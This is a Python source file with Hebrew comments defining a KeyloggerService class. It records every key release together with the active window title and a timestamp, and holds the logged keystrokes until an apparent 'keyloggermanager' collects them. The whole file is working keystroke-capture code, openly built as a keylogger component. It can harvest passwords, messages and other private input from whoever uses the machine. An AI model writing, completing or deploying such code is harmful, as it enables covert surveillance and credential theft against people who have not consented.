import keyboard
from datetime import datetime
import pygetwindow as pw

class KeyloggerService:

    '''
    המחלקה אחראית לקבל כל הקשה של המשתמש ולקבל את הנתונים עליה
    הנתונים הם איזה מקש לחץ מתי לחץ אותו ובאיזה אפליקציה
    הנתונים נשמרים בדאטה של המחלקה עד שהkeyloggermanager מבקש ואז נמחק
    '''

    #אתחול המחלקה עם שדה דאטה והתחלת ההקלטת מקשים
    def __init__(self):
        self.__data = {}
        self.start()

    #פונקציה להחזרת הנתונים למנהל ומחיקתם מהמחלקה
    @property
    def data(self):
        temp_data = self.__data
        self.__data = {}
        return temp_data

    #התחלת ההקלטה של המקשים
    def start(self):
        keyboard.on_release(self.handle_input)

    #קבלת השם של המקש שנלחץ
    def get_keyword(self,key:keyboard.KeyboardEvent):
        key_name = key.name
        # כדי להבדיל בין תווים למקשים מיוחדים
        # צריך למצוא דרך איך שלא יהיה תו מיוחד אם לחץ על שני מקשים בו זמנית
        # צריך לדעת איך לתקן הצפנה של תווים מיוחדים
        if len(key_name) > 1:
            key_name = "~" + key_name + "~"
        #
        return key_name

    #קבלת הזמן של לחיצת המקש
    def get_time(self,key:keyboard.KeyboardEvent):
        current_time = key.time
        current_time = datetime.fromtimestamp(current_time).strftime("%Y-%m-%d %H:%M")
        return current_time

    # קבלת האפליקציה שבה נלחץ המקש
    def get_active_window(self):
        return pw.getActiveWindowTitle()

    #קבלת כל הנתונים של ההקשה ושמירה בזיכרון
    def handle_input(self,key):

        active_window = self.get_active_window()
        if active_window not in self.__data:
            self.__data[active_window] = {}

        current_time = self.get_time(key)
        if current_time not in self.__data[active_window]:
            self.__data[active_window][current_time] = ""

        key_name = self.get_keyword(key)
        self.__data[active_window][current_time] += key_name





